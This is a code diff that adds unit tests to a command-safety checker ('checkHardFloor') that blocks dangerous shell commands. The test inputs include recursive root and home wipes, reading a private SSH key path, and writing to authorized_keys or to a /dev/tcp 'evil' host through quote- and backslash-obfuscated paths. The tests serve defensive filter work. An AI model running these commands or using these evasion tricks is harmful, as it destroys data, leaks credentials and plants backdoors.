@@ -113,4 +113,26 @@ describe('checkHardFloor', () => {
     expect(r.reason).toContain('curl');
     expect(r.reason).toContain('never permitted');
   });
+  it('blocks a nested-glob root wipe — /*/ and /*/* reduce to root, not to an unfloored /*', () => {
+    // the operand is reduced to its leading glob-free prefix before matching, so a trailing path
+    // segment after the glob (`/*/`) cannot leave a normalized `/*` that matches no floored root.
+    expect(floor('rm -rf /*/').blocked).toBe(true);
+    expect(floor('rm -rf /*/*').blocked).toBe(true);
+  });
+  it('blocks a nested-glob home wipe — /home/*/ and ~/*/ reduce to the home root', () => {
+    expect(floor('rm -rf /home/*/').blocked).toBe(true);
+    expect(floor('rm -rf ~/*/').blocked).toBe(true);
+  });
+  it('blocks a secret file named as a mid-path directory component (/x/id_rsa/y), not only as a leaf', () => {
+    // the secret pattern matches a secret name followed by end-OR-separator, so a key directory
+    // deeper in the path is caught, not just a trailing filename.
+    expect(floor('cat /x/id_rsa/y').blocked).toBe(true);
+  });
+  it('blocks an interior-quoted / backslash-split redirect target — canonicalized before the match', () => {
+    // the redirect target node is canonicalized (quotes/escapes collapsed) exactly like an argv path,
+    // so `~/.s"s"h` / `~/.ss\h` reach the secret match and `/de"v"/tcp` reaches the /dev/tcp egress match.
+    expect(floor('echo x > ~/.s"s"h/authorized_keys').blocked).toBe(true);
+    expect(floor('echo x > ~/.ss\\h/authorized_keys').blocked).toBe(true);
+    expect(floor('cat x > /de"v"/tcp/evil/443').blocked).toBe(true);
+  });
 });
